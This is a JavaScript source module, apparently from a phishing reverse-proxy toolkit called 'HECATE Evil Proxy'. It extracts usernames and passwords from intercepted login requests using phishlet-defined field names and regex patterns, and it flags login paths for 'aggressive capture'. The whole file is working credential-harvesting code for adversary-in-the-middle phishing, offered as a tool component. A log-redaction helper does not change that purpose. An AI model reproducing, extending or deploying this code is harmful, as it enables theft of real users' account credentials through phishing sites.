'use strict';

/**
 * HECATE Evil Proxy — Credential Capture
 * Extracts username/password pairs from request bodies using
 * phishlet-defined regex patterns.
 *
 * Supports:
 *   - application/x-www-form-urlencoded
 *   - application/json
 *   - multipart/form-data (field names only — no file content)
 *   - Raw body regex scan (fallback)
 *
 * Pure functions — no side effects.
 */

/**
 * Extract credentials from a request body.
 * @param {string}   body         - raw request body
 * @param {string}   contentType  - Content-Type header value
 * @param {object[]} patterns     - phishlet credentials array (with compiled .re)
 * @returns {CaptureResult}
 */
function capture(body, contentType, patterns) {
  if (!body || !patterns?.length) {
    return { found: false, credentials: {}, raw: {} };
  }

  const ct  = (contentType ?? '').toLowerCase();
  let parsed = {};

  // Parse body based on content type
  if (ct.includes('application/x-www-form-urlencoded')) {
    parsed = parseUrlEncoded(body);
  } else if (ct.includes('application/json')) {
    parsed = parseJson(body);
  } else if (ct.includes('multipart/form-data')) {
    parsed = parseMultipart(body);
  }

  const credentials = {};
  const raw         = {};

  // Apply phishlet patterns
  for (const pattern of patterns) {
    let value = null;

    // Try exact field match in parsed body first
    if (pattern.key && parsed[pattern.key] !== undefined) {
      value = String(parsed[pattern.key]);
    }

    // Regex scan of raw body
    if (!value && pattern.re) {
      const m = body.match(pattern.re);
      if (m?.[1]) value = decodeURIComponent(m[1].replace(/\+/g, ' '));
    }

    if (value !== null && value.trim().length > 0) {
      credentials[pattern.key] = value;
      raw[pattern.key]         = value;
    }
  }

  const found = Object.keys(credentials).length > 0;
  return { found, credentials, raw };
}

/**
 * Parse application/x-www-form-urlencoded body.
 */
function parseUrlEncoded(body) {
  try {
    const params = new URLSearchParams(body);
    const out    = {};
    for (const [k, v] of params) out[k] = v;
    return out;
  } catch {
    return {};
  }
}

/**
 * Parse application/json body — flatten nested objects one level.
 */
function parseJson(body) {
  try {
    const obj = JSON.parse(body);
    if (typeof obj !== 'object' || obj === null) return {};
    const out = {};
    for (const [k, v] of Object.entries(obj)) {
      out[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
    }
    return out;
  } catch {
    return {};
  }
}

/**
 * Extract field name/value pairs from multipart body.
 * Skips file parts (Content-Disposition with filename).
 */
function parseMultipart(body) {
  const out    = {};
  const fieldRe = /Content-Disposition:\s*form-data;\s*name="([^"]+)"(?!.*filename=)[\r\n]+([^\r\n-][^-]*?)(?=--)/gis;
  let m;
  while ((m = fieldRe.exec(body)) !== null) {
    out[m[1]] = m[2].trim();
  }
  return out;
}

/**
 * Redact credential values for logging — show only length.
 * Never logs actual credentials.
 */
function redact(credentials) {
  const out = {};
  for (const [k, v] of Object.entries(credentials)) {
    out[k] = v.length >= 3
      ? `${v.slice(0, 1)}${'*'.repeat(Math.min(v.length - 1, 8))}[${v.length}]`
      : '[REDACTED]';
  }
  return out;
}

/**
 * Check if a URL path matches any of the phishlet's authUrls.
 * These are paths where auth is expected — triggers aggressive capture.
 */
function isAuthUrl(path, authUrls) {
  if (!authUrls?.length) return false;
  return authUrls.some(pattern => {
    if (pattern instanceof RegExp) return pattern.test(path);
    return path.startsWith(pattern) || path === pattern;
  });
}

module.exports = { capture, parseUrlEncoded, parseJson, parseMultipart, redact, isAuthUrl };
